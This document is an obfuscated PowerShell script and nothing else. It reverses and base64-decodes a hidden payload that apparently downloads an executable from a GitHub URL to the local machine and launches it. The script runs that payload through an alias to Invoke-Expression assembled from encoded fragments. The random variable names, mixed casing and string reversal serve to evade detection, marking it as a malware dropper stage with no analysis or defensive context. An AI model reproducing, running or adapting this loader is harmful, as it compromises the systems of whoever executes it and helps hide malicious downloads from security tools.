$tEkHGNu4fF3wgVy = "7UWdsFmVnVmckASZ1xWYW1CIl1WYOdWZyRCIl1WYO1CIoRXYQdWZyRCIoRXYQ1CI5RnclB3byBVblRXStQXZTpAI7gGdhBFJg0DIlVHbhZ1ZlJHJKAyOiQmbpdlIg0DIl1WYOdWZyRiCgsjIuVnUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90UcpTVDtESiASPggGdhB1ZlJHJgsDa0FGUkACa0FGUlxWaG1CIzNXZj9mcQ1CdyFGdTpAI7gGdhBFJgUGbpZEd19ULgwkUVRCIJJVVtACdzVWdxVmUiV2VtU2avZnbJpAI7AiIlhXZucmbpd3bsx2bIN3clN2byBFXiAyKgEEVBREUQFkO25WZkASPggGdhBFJKsjIlhXZucmbpd3bsx2bIN3clN2byB1LulWYt9iYvxmYvIWYs9ibp1WM0MTailmYv02bj5iY1hGdpd2LvozcwRHdoJCI9ACTSVFJ" ;
$WgCHGSDUfdj4ssrAv = $tEkHGNu4fF3wgVy.ToCharArray() ; [array]::Reverse($WgCHGSDUfdj4ssrAv) ; $QY4yZfADKGBICij9uMg0F3P5s = -join $WgCHGSDUfdj4ssrAv ;
$WfhB = switch ($QY4yZfADKGBICij9uMg0F3P5s.Length % 4) { 0 { $QY4yZfADKGBICij9uMg0F3P5s }; 1 { $QY4yZfADKGBICij9uMg0F3P5s.Substring(0, $QY4yZfADKGBICij9uMg0F3P5s.Length - 1) }; 2 { $QY4yZfADKGBICij9uMg0F3P5s + ("=" * 2) }; 3 { $QY4yZfADKGBICij9uMg0F3P5s + "=" }} ;
$X3ngqVOY = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($WfhB)) ;
$ru592yqnPwzlg0ER = '42TpN1clJFUYVWLFt2bW5US'.ToCharArray() ; [array]::Reverse($ru592yqnPwzlg0ER) ; $D8 = -join $ru592yqnPwzlg0ER ;
$D8 = switch ($D8.Length % 4) { 0 { $D8 }; 1 { $D8.Substring(0, $D8.Length - 1) }; 2 { $D8 + '=' * 2 }; 3 { $D8 + '=' } } ;
$WackfJhtv4rs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($D8)) ;
$VMa4t5O = 'wbUtES'.ToCharArray() ; [array]::Reverse($VMa4t5O) ; $E1rhonw3Ha4V = -join $VMa4t5O ;
$E1rhonw3Ha4V = switch ($E1rhonw3Ha4V.Length % 4) { 0 { $E1rhonw3Ha4V }; 1 { $E1rhonw3Ha4V.Substring(0, $E1rhonw3Ha4V.Length - 1) }; 2 { $E1rhonw3Ha4V + '=' * 2 }; 3 { $E1rhonw3Ha4V + '=' } } ;
$UWP4 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($E1rhonw3Ha4V)) ;
$NuLl = New-ALIas -NaME $UWP4 -ValUe $WackfJhtv4rs -foRcE ; & $UWP4 $X3ngqVOY ;

